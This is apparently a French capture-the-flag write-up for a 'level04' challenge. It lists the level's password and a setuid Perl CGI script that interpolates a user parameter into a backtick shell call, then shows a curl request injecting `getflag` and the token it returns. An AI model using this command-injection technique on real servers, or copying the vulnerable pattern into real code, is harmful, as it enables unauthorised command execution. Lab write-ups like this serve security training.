
**LOGIN: level04**

**PASSWORD: qi0maab88jeaj46qoumi7maus**

 ----

```
ls -l ; echo ; file level04.pl 
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl

level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
```

le script perl : 
```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

On a un exploit sur un subshell invoqué avec une variable ouverte à l'utilisateur 

```
curl 'http://192.168.0.15:4747/?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

**TOKEN: ne2searoevaevoem4ov4ar8ap**



---

### POURQUOI ?x=;getflag NE FONCTIONNE PAS?
